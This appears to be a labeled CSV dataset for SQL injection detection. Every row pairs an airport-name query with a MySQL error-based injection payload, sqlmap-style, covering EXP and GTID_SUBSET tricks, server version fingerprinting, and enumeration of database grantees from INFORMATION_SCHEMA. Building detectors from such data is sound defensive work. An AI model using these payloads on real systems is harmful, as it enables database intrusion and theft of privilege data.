full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport WHERE 8028=8028 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- jXfe""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport+(SELECT RRxP WHERE 5461=5461 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))+""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AS atZa WHERE 1757=1757 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- fJYP""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AS grev WHERE 1481=1481 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- BFuQ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport` WHERE 5524=5524 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- Gvod""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`) WHERE 9693=9693 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- PgTs""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`=`BucksAirport` AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND `BucksAirport`=`BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport]-(SELECT 0 WHERE 1407=1407 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))|[BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- qqaF""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- MAMt""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- fQLH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ('PNOv'='PNOv""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (('cGpg'='cGpg""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ((('zoKa'='zoKa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND 'OWqv'='OWqv""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ('eYah' LIKE 'eYah""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (('pyKH' LIKE 'pyKH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ((('ABjX' LIKE 'ABjX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport%' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND 'LqXz%'='LqXz""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND 'hifX' LIKE 'hifX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (""aEFv""=""aEFv""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ((""AkCK""=""AkCK""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (((""kaVp""=""kaVp""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ""bgfC""=""bgfC""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (""HMzh"" LIKE ""HMzh""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ((""Bops"" LIKE ""Bops""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (((""nrqD"" LIKE ""nrqD""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ""fUOn"" LIKE ""fUOn""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) OR 'DzpS'='zPBi""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') WHERE 7727=7727 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- KTZf""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") WHERE 6819=6819 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- UUPM""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' WHERE 2413=2413 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- kKoZ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" WHERE 4829=4829 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- yZCc""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'||(SELECT 0x6f537071 WHERE 5137=5137 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))||'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'||(SELECT 0x6e456245 FROM DUAL WHERE 3024=3024 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))||'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'+(SELECT 0x4b56534b WHERE 5083=5083 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))+'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport||(SELECT 0x48457477 FROM DUAL WHERE 2813=2813 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))||""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport||(SELECT 0x455a6e5a WHERE 2697=2697 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))||""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport+(SELECT 0x707a736d WHERE 3656=3656 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))+""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AS Utyo WHERE 4344=4344 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- dgtE""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AS LZLT WHERE 2659=2659 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- UWDG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AS UsjR WHERE 1298=1298 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- nIxf""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AS sucy WHERE 9770=9770 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- NsWd""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""=""BucksAirport"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ""BucksAirport""=""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' IN BOOLEAN MODE) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- vOAS""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (9657=9657""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND ((7231=7231""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND (((6528=6528""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- fNUW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))# riof""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) WHERE 2508=2508 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- HPlW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport WHERE 5912=5912 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- isVd""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport+(SELECT UmGn WHERE 5459=5459 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))+""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AS DCpD WHERE 6930=6930 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- AjnL""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AS quXk WHERE 4077=4077 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- GhoH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport` WHERE 4185=4185 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- HhMy""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`) WHERE 3814=3814 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x))-- SRgI""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`=`BucksAirport` OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)) AND `BucksAirport`=`BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport]-(SELECT 0 WHERE 2141=2141 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6911=6911,1))),0x71626a6271,0x78))x)))|[BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (ELT(9529=9529,1))),0x71626a6271),9529)-- gxSN""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (ELT(9529=9529,1))),0x71626a6271),9529)-- GzaL""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (ELT(9529=9529,1))),0x71626a6271),9529)-- pVYz""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (CASE WHEN (5133=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5133) THEN 1 ELSE 0 END)),0x71626a6271),4084)-- YUxi""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT REPEAT(0x34,1024)),0x71626a6271),1034)-- QXcx""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT REPEAT(0x30,190)),0x71626a6271),1592)-- Qavs""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END)),0x71626a6271),4773)-- OmKX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END)),0x71626a6271),6476)-- Gbkt""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END)),0x71626a6271),5549)-- kaCI""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END)),0x71626a6271),7908)-- NfFO""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT (CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END)),0x71626a6271),8000)-- lzCn""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT IFNULL(CAST(COUNT(grantee) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x71626a6271),8884)-- FPab""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1),0x71626a6271),4203)-- fvge""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1),0x71626a6271),9767)-- irRS""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1),0x71626a6271),9037)-- pusQ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1),0x71626a6271),2047)-- MZUz""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1),0x71626a6271),3168)-- GFku""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 6,1),0x71626a6271),5854)-- HqDP""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 8,1),0x71626a6271),6733)-- VmWx""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 7,1),0x71626a6271),1757)-- mRkw""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 5,1),0x71626a6271),8126)-- Nlim""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND GTID_SUBSET(CONCAT(0x7171626271,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 9,1),0x71626a6271),5929)-- KoPi""",1,airport-S3,Unknown,Unknown
